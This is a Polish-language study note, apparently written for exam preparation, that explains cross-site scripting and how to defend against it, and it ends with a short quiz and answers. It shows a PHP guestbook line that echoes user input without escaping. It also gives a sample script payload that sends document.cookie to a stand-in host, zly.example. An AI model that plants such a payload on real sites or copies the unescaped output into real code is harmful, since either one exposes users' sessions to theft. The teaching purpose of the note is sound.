**W skrócie:** **XSS (Cross-Site Scripting)** to wstrzyknięcie na stronę **skryptu JavaScript**, który wykona się w przeglądarkach innych użytkowników. Dzieje się tak, gdy strona wyświetla dane od użytkownika bez **escapowania**, czyli bez zamiany znaków specjalnych HTML na bezpieczne odpowiedniki.

## Jak działa atak

Księga gości wyświetla wpisy wprost:

```php
echo "<p>" . $wpis["tresc"] . "</p>";
```

Ktoś dodaje wpis:

```html
<script>fetch("https://zly.example/?c=" + document.cookie)</script>
```

Każdy, kto otworzy księgę gości, uruchomi ten skrypt — może on wykraść ciasteczka sesji, podmienić treść strony albo wysłać formularz w imieniu ofiary.

## Rodzaje XSS

| Rodzaj | Skąd pochodzi skrypt |
|---|---|
| **Trwały (stored)** | zapisany w bazie (komentarze, profile) — trafia do wszystkich odwiedzających |
| **Odbity (reflected)** | z adresu URL lub formularza, np. `szukaj.php?q=<script>…`; ofiarę trzeba namówić na kliknięcie linku |
| **DOM-based** | JavaScript na stronie sam wstawia dane do HTML, np. przez `innerHTML` |

## Obrona: escapowanie przy wypisywaniu

**PHP:**

```php
echo "<p>" . htmlspecialchars($wpis["tresc"], ENT_QUOTES, "UTF-8") . "</p>";
```

`htmlspecialchars` zamienia znaki specjalne na encje:

| Znak | Encja |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#039;` (z `ENT_QUOTES`) |

Przeglądarka wyświetli wtedy `<script>` jako **zwykły tekst**, a nie wykona go.

**JavaScript:** wstawiaj tekst przez **`textContent`**, nie `innerHTML`:

```js
element.textContent = daneOdUzytkownika;   // bezpieczne
element.innerHTML = daneOdUzytkownika;     // niebezpieczne
```

## Dodatkowe warstwy ochrony

- **Content Security Policy (CSP)** — nagłówek, który zabrania przeglądarce uruchamiać skrypty spoza zaufanych źródeł.
- Ciasteczka sesji z flagą **HttpOnly** — JavaScript nie może ich odczytać.
- Walidacja danych wejściowych (np. imię nie potrzebuje znaków `<` i `>`).
- Linki od użytkownika: dopuszczaj tylko `http:` i `https:`, nigdy `javascript:`.

Zasada: **escapuj przy wypisywaniu**, w kontekście, w którym dane trafiają na stronę (HTML, atrybut, JavaScript, URL).

## Na egzaminie

- XSS = wstrzyknięcie JavaScriptu, SQL injection = wstrzyknięcie SQL.
- Obrona w PHP: `htmlspecialchars()`; w JS: `textContent` zamiast `innerHTML`.
- `<` po escapowaniu to `&lt;`.

## Sprawdź się

1. Czym różni się XSS od SQL injection?
2. Jak zostanie zapisany znak `<` po użyciu `htmlspecialchars`?
3. Która właściwość jest bezpieczna przy wstawianiu tekstu od użytkownika w JS: `innerHTML` czy `textContent`?

**Odpowiedzi:** 1. XSS wstrzykuje skrypt wykonywany w przeglądarce ofiary, SQL injection — polecenie SQL wykonywane przez bazę. 2. `&lt;`. 3. `textContent`.
